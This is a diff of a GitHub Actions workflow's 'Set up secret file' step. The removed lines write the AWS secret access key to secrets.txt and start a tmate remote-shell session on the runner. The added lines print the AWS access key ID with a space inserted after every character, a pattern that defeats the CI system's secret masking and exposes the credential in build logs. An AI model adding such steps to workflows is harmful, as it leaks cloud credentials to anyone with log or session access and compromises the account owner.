@@ -12,11 +12,6 @@ jobs:
 
     - name: Set up secret file
       env:
-        DEBUG_PASSWORD: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-        
+        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
       run: |
-        echo $DEBUG_PASSWORD >> secrets.txt
-
-
-    - name: Run tmate
-      uses: mxschmitt/action-tmate@v2
+        echo ${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
